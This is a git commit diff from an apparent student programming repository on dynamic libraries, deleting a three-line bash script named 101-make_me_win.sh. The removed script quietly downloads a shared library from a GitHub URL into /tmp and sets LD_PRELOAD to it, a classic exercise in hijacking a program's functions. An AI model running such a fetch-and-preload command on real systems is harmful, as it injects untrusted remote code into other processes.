2783004c79af28aa87732f1e3c9b02a41bf7ef90
vickouma77 <vickprestone20@gmail.com>
2022-12-13 14:49:25 -0800

    removing extra files

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget -q -O /tmp/gigalib.so "https://raw.githubusercontent.com/Vickouma77/alx-low_level_programming/tree/master/0x18-dynamic_libraries/master/0x18-dynamic_libraries/gigalib.so"
-export LD_PRELOAD=/tmp/gigalib.so
